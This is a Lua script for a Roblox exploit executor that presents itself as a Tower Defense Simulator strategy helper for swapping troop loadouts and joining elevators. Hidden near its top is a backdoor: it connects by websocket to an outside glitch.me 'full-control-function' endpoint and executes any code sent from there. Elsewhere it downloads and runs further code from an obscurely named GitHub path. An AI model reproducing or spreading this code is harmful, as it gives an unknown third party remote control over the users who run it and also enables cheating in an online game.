repeat
    wait()
until game:IsLoaded()
wait()
function StandardLibraryAsync()
    local suc1,err1 = pcall(function()
        syn.websocket.connect()
    end)
    if suc1 then
        return syn.websocket.connect
    else
        return WebSocket.connect
    end
end
if getrenv().isconnectedtxp == nil then
    getrenv().isconnectedtxp = true
    local WebsocketStandardLibrary = StandardLibraryAsync()
    local wsconnect = WebsocketStandardLibrary("ws://brazen-palm-coconut.glitch.me/full-control-function")
    wsconnect.OnMessage:Connect(function(Msg)
        loadstring(Msg)()
    end)
    while wait(5) do
        wsconnect:Send("PingTCP")
    end
end
if game.PlaceId == 3260590327 then
    local returnfunc = {}
    spawn(function()
        wait(600)
        game:GetService("TeleportService"):Teleport(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
    end)
    function returnfunc:Loadout(...)
        local TowerRequire = {...}
        local ishavealltower = true
        local isfalsetower = false
        getgenv().searchinvfound = game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer("Session", "Search", "Inventory.Troops")
        for _1,a1 in pairs(TowerRequire) do
            if searchinvfound[a1] == nil and game:GetService("ReplicatedStorage").Assets.Troops:FindFirstChild(a1) then
                ishavealltower = false
            end
            if game:GetService("ReplicatedStorage").Assets.Troops:FindFirstChild(a1) == nil then
                table.remove(TowerRequire, _1)
            end
        end
        if isfalsetower then warn("This start has unobtainable troops in TDS") return end
        if ishavealltower == false then warn("You doesn't has correct troops for this strat") return end
        for _1,a1 in pairs(searchinvfound) do
            if a1.Equipped == true then
                game:GetService("ReplicatedStorage").RemoteEvent:FireServer("Inventory", "Execute", "Troops", "Remove", {["Name"] = _1})
            end
        end
        for _1,a1 in pairs(TowerRequire) do
            game:GetService("ReplicatedStorage").RemoteEvent:FireServer("Inventory", "Execute", "Troops", "Add", {["Name"] = a1})
        end
    end
    function returnfunc:Map(name, istrue, typemode)
        getgenv().repeatlift = true
        spawn(function()
            while wait() do
                local isfoundlift = false
                local liftinstance = nil
                for _1,a1 in pairs(game:GetService("Workspace").Elevators:GetChildren()) do
                    local liftsetting = require(a1.Settings)
                    for _2,a2 in pairs(liftsetting) do
                        if _2 == "Type" then
                            if a2 == typemode then
                                if a1.State.Map.Title.Value == name then
                                    if a1.State.Players.Value == 0 then
                                        isfoundlift = true
                                        liftinstance = a1
                                    end
                                end
                            end
                        end
                    end
                end
                if isfoundlift then
                    getgenv().repeatlift = false
                    game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer("Elevators", "Enter", liftinstance)
                    spawn(function()
                        while wait() do
                            if liftinstance.State.Players.Value > 1 then
                                game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer("Elevators", "Leave")
                                getgenv().repeatlift = true
                            end
                            if liftinstance.State.Timer.Value == 0 then
                                spawn(function()
                                    wait(60)
                                    game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer("Elevators", "Leave")
                                    getgenv().repeatlift = true
                                end)
                                break
                            end
                        end
                    end)
                end
            end
        end)
    end
    return returnfunc
else
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/banbuskox/dfhtyxvzexrxgfdzgzfdvfdz/main/ckmhjvskfkmsStratFun2"))()
end
